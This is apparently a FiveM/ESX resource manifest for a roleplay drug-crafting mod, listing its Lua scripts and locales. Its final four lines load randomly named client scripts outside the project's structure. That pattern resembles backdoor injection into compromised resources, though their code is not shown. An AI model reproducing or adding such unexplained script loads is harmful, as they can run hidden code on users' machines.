




resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Drugs'

version '2.0.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'locales/fr.lua',	
	'locales/sv.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'locales/fr.lua',	
	'locales/sv.lua',
	'config.lua',
	'client/main.lua',
	'client/weed.lua',
	'client/cocaine.lua',
	'client/ephedrine.lua',
	'client/meth.lua',
	'client/opium.lua',
	'client/crack.lua',
	'client/heroine.lua'
}

dependencies {
	'essentialmode'
}

client_script 'CtMMQnqkhyopWI4N.lua'
client_script 'mYEV.lua'
client_script 'L539.lua'
client_script 'jtxU.lua'


